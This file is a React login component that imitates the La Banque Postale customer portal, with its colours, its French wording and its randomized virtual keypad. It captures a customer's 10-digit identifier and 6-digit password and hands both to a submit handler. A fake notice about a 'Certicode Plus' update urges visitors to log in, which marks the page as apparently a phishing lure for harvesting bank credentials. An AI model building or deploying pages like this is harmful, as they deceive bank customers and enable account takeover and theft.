import { useEffect, useMemo, useState } from "react";

/**
 * Faithful reproduction of the official La Banque Postale customer portal login:
 *  - Step A: 10-digit identifiant input with underscore placeholders + "Mémoriser mon identifiant" switch + "Continuer".
 *  - Step B: 6-digit password entered via a randomized virtual keypad. Puces (dots) fill as digits are clicked.
 *    "N'appuyez pas sur les chiffres de votre clavier, utilisez les boutons suivants" (accessibility note).
 */

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

export default function LoginStep({ onSubmit, submitting }) {
  const [identifiant, setIdentifiant] = useState("");
  const [showPasswordPanel, setShowPasswordPanel] = useState(false);
  const [memorize, setMemorize] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [touchedId, setTouchedId] = useState(false);

  // Randomized keypad digits (re-shuffled when password panel opens)
  const [keypadKey, setKeypadKey] = useState(0);
  const keypadDigits = useMemo(
    () => shuffle(["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [keypadKey]
  );

  useEffect(() => {
    if (showPasswordPanel) {
      setKeypadKey((k) => k + 1);
      setPassword("");
    }
  }, [showPasswordPanel]);

  const handleIdentifiantChange = (e) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 10);
    setIdentifiant(v);
    if (error) setError("");
  };

  const handleContinuer = (e) => {
    e.preventDefault();
    if (identifiant.length !== 10) {
      setError("L'identifiant doit contenir 10 chiffres.");
      setTouchedId(true);
      return;
    }
    setError("");
    setShowPasswordPanel(true);
  };

  const handleKeyClick = (digit) => {
    if (password.length >= 6) return;
    setPassword((p) => p + digit);
    if (error) setError("");
  };

  const handleErasePassword = () => {
    setPassword("");
  };

  const handleSeConnecter = (e) => {
    e.preventDefault();
    if (password.length !== 6) {
      setError("Le mot de passe doit contenir 6 chiffres.");
      return;
    }
    setError("");
    onSubmit({
      identifiant,
      mot_de_passe: password,
      memorise: memorize,
    });
  };

  // Render 10 underscore-style slots, replaced by digits as typed
  const renderIdSlots = () => {
    const slots = [];
    for (let i = 0; i < 10; i++) {
      slots.push(
        <span
          key={i}
          className="inline-flex w-5 sm:w-6 justify-center font-mono text-lg sm:text-xl tracking-wide"
        >
          {identifiant[i] || <span className="text-[#0033A0]/40">_</span>}
        </span>
      );
    }
    return slots;
  };

  return (
    <div className="fade-in" data-testid="login-step">
      <h1 className="text-2xl sm:text-3xl font-semibold tracking-tight text-[#0033A0]">
        Accédez à votre Espace Client
      </h1>
      <p className="mt-1 text-sm text-[#4F5A6B]">
        Mise à jour de votre Certicode Plus en cours. Identifiez-vous pour continuer.
      </p>

      <form onSubmit={handleContinuer} className="mt-6 space-y-5" data-testid="login-form">
        {/* Identifiant */}
        <div className="space-y-2">
          <label
            htmlFor="identifiant"
            className="block text-sm font-semibold text-[#0033A0]"
          >
            Identifiant (10 chiffres)
          </label>
          <div className="relative">
            <div
              className={`flex items-center justify-between rounded-md border bg-white px-4 py-3 transition ${
                touchedId && identifiant.length !== 10
                  ? "border-[#C8102E]"
                  : "border-[#0033A0]"
              } focus-within:ring-2 focus-within:ring-[#0033A0]/30`}
            >
              <div className="flex items-center gap-0.5 select-none pointer-events-none">
                {renderIdSlots()}
              </div>
              {identifiant.length > 0 && !showPasswordPanel && (
                <button
                  type="button"
                  data-testid="login-clear-id"
                  onClick={() => setIdentifiant("")}
                  className="ml-2 text-xs text-[#4F5A6B] hover:text-[#0033A0]"
                  aria-label="Effacer la saisie de l'identifiant"
                >
                  Effacer
                </button>
              )}
            </div>
            <input
              id="identifiant"
              data-testid="login-identifiant-input"
              type="tel"
              inputMode="numeric"
              autoComplete="username"
              maxLength={10}
              value={identifiant}
              onChange={handleIdentifiantChange}
              onBlur={() => setTouchedId(true)}
              disabled={showPasswordPanel}
              className="absolute inset-0 h-full w-full opacity-0 cursor-text"
              aria-label="Identifiant 10 chiffres"
            />
          </div>
        </div>

        {/* Switch mémoriser */}
        <button
          type="button"
          data-testid="login-memorize-toggle"
          onClick={() => setMemorize((v) => !v)}
          className="flex items-center gap-3 text-sm text-[#4F5A6B] select-none"
        >
          <span className={`lbp-switch ${memorize ? "on" : ""}`}>
            <span className="lbp-switch-knob" />
          </span>
          <span>Mémoriser mon identifiant</span>
        </button>

        {/* Continuer button - hidden once password panel is shown */}
        {!showPasswordPanel && (
          <button
            type="submit"
            data-testid="login-continuer"
            disabled={submitting}
            className="w-full h-12 rounded-md bg-[#0033A0] hover:bg-[#002378] active:bg-[#001A5C] text-white text-base font-semibold transition disabled:opacity-60"
          >
            Continuer
          </button>
        )}

        {error && !showPasswordPanel && (
          <p data-testid="login-error" className="text-sm text-[#C8102E]">
            {error}
          </p>
        )}
      </form>

      {/* Password panel */}
      {showPasswordPanel && (
        <div className="mt-6 slide-down" data-testid="password-panel">
          <div className="text-sm font-semibold text-[#0033A0]">
            Mot de passe (6 chiffres)
          </div>

          {/* Puces */}
          <div className="mt-3 flex items-center gap-3" aria-live="polite">
            {[0, 1, 2, 3, 4, 5].map((i) => (
              <span
                key={i}
                data-testid={`pwd-dot-${i}`}
                className={`h-4 w-4 rounded-full border-2 transition ${
                  password.length > i
                    ? "bg-[#0033A0] border-[#0033A0]"
                    : "border-[#0033A0]/40"
                }`}
              />
            ))}
            {password.length > 0 && (
              <button
                type="button"
                data-testid="pwd-clear"
                onClick={handleErasePassword}
                className="ml-2 text-xs text-[#4F5A6B] hover:text-[#0033A0]"
              >
                Effacer
              </button>
            )}
          </div>

          {/* Virtual randomized keypad - 5 cols x 2 rows */}
          <div
            data-testid="virtual-keypad"
            className="mt-5 grid grid-cols-5 gap-2 sm:gap-3 max-w-md"
          >
            {keypadDigits.map((digit, idx) => (
              <button
                key={`${keypadKey}-${idx}`}
                type="button"
                data-testid={`keypad-key-${digit}`}
                onClick={() => handleKeyClick(digit)}
                disabled={password.length >= 6 || submitting}
                className="h-12 sm:h-14 rounded-md border border-[#B6CDEC] bg-[#E8F1FB] text-[#0033A0] text-lg sm:text-xl font-semibold hover:bg-[#D6E5F7] active:bg-[#C2D6F0] disabled:opacity-50 transition"
              >
                {digit}
              </button>
            ))}
          </div>

          <p className="mt-3 text-xs text-[#7A8294]">
            N'appuyez pas sur les chiffres de votre clavier, utilisez les boutons ci-dessus.
          </p>

          {error && (
            <p data-testid="login-error" className="mt-3 text-sm text-[#C8102E]">
              {error}
            </p>
          )}

          <button
            type="button"
            data-testid="login-submit"
            onClick={handleSeConnecter}
            disabled={submitting || password.length !== 6}
            className="mt-6 w-full h-12 rounded-md bg-[#0033A0] hover:bg-[#002378] active:bg-[#001A5C] text-white text-base font-semibold transition disabled:opacity-60"
          >
            {submitting ? "Connexion…" : "Se connecter"}
          </button>

          <button
            type="button"
            data-testid="login-change-id"
            onClick={() => {
              setShowPasswordPanel(false);
              setPassword("");
              setError("");
            }}
            className="mt-3 w-full text-sm text-[#0033A0] hover:underline"
          >
            ← Modifier l'identifiant
          </button>
        </div>
      )}
    </div>
  );
}
